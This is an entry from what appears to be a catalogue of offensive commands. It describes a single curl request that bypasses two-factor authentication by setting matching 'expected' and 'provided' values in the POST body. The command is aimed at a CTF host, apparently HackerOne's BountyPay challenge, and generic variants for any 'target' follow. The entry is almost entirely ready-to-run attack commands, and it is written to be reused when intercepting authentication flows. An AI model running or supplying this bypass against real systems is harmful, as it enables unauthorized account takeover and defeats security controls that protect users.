---
data: >-
  curl -X POST 'https://bountypay.h1ctf.com/2fa-verify' -d
  'expected=123456&provided=123456' -b 'session=VALID_SESSION'
tags:
  - authentication
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:58.086Z'
id: 23aa2876-9a32-451a-8d2c-1720fb075dd9
verified: false
validated: true
submitted: true
---
# curl-2fa-bypass

## Command

```bash
curl -X POST 'https://bountypay.h1ctf.com/2fa-verify' -d 'expected=123456&provided=123456' -b 'session=VALID_SESSION'
```

## Description

Sends a manipulated POST to bypass 2FA by matching comparison values. Use when intercepting auth flows.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method | Yes |
| `-d` | Data payload | Yes |
| `-b` | Cookie session | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target/2fa' -d 'expected=foo&provided=foo'
```

### Advanced Usage

```bash
curl -X POST 'https://target/2fa' -d 'expected=foo&provided=foo' -H 'User-Agent: Mozilla'
```

## Expected Output

JSON response like {"status":"success", "access":"granted"}.

## Related

- [[Related Procedure]]
